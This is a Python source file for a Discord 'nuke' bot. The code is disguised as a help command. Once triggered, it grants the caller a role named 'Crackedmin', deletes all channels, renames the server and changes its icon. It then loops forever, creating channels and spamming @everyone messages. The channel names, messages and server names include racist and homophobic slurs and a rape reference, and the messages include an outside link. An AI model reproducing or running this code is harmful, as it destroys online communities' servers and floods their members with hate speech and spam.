import discord, random
from discord.ext import commands
from discord.utils import get
funny = ["get fucked", "kys fags", "UNGA BUNGA", "Nuked by GDR (based)", "I HATE BLACKIES NIGGERS"]
words = ["@everyone GET FUCKED", "@everyone WAKE UP RETARDS", "@everyone AHAHAHAH", "@everyone NUKED BY GDR", "@everyone https://liesandreality.000webhostapp.com", "@everyone https://media.discordapp.net/attachments/863392124095299596/863393036885033020/s1100_01-groot-.png?width=766&height=595"]
servername = ["GDR district Colonial", "GDR colony", "Raped by GDR"]
image = open("icon.jpg", 'rb')
img = image.read()
async def nuke(ctx, client):
    await ctx.send("Help will come your way in just a minute...")
    client.remove_command('help')
    guild = ctx.guild
    author = ctx.message.author
    server_r = random.choice(servername)
    role = get(author.guild.roles, name="Crackedmin")
    await author.add_roles(role)
    for channel in guild.channels:
        await channel.delete()
        print(f"Deleted Channel: '{channel}'")
    await guild.edit(name=server_r, icon=img)
    while True:
        try:
            funny_r = random.choice(funny)
            words_r = random.choice(words)
            member_r = random.choice(guild.members)
            await guild.create_text_channel(funny_r)
            await random.choice(guild.text_channels).send(words_r)
            print(f"Created Channel: '{funny_r}'")
            print(f"Message Send: '{words_r}'")
        except:
            words_r = random.choice(words)
            await random.choice(guild.text_channels).send(words_r)
            print(f"Message Send: '{words_r}'")